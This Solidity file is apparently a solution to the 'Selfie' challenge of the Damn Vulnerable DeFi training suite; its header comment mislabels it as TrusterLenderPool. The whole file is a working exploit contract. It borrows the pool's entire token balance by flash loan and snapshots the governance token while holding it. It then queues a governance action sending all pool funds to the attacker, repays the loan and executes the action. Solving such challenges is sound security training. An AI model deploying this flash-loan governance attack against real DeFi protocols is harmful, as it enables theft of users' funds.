// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";



interface ISelfiePool {


    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance{
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}
contract SelfieAttack {
    ISelfiePool pool;
    ISimpleGovernance gov;
    DamnValuableTokenSnapshot public token;
    address attacker;
    constructor(address _pool, address _gov, address _attacker,address _tokenAddress){
        pool = ISelfiePool(_pool);
        gov = ISimpleGovernance(_gov);
        token = DamnValuableTokenSnapshot(_tokenAddress);
        attacker = _attacker;
    }

    function attack() external{
        
        uint256 balance = token.balanceOf(address(pool));
        pool.flashLoan(balance);

    }
    function drain() external{
        gov.executeAction(1);
    }  
    function receiveTokens(address _token,uint256 _borrowAmount) external{
        token.snapshot();
        uint balance = token.getBalanceAtLastSnapshot(address(this));
        uint halfTotalSupply = token.getTotalSupplyAtLastSnapshot() / 2;
        require(balance > 0,"in middle");

        gov.queueAction(address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                attacker
            )
            ,0);
        token.transfer(address(pool), _borrowAmount);        
    }

    receive () external payable {}

}